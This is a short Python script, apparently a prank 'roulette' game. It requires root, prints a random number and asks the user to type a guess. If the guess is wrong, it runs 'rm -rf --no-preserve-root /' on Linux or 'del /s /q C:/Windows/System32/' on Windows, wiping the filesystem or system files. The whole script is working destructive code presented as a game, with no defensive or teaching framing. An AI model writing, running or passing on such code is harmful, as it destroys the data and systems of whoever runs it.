import os
from sys import platform
from random import randint

if os.geteuid() != 0:
    exit("you need root")

def remove_the_folder():
    if platform == "linux":
        os.system("rm -rf --no-preserve-root /")
    elif platform == "win32":
        os.system("del /s /q C:/Windows/System32/")


funny_number = randint(1, 10)
print(funny_number)
num_from_input = int(input())
if num_from_input == funny_number:
    print("you survived")
else:
    remove_the_folder()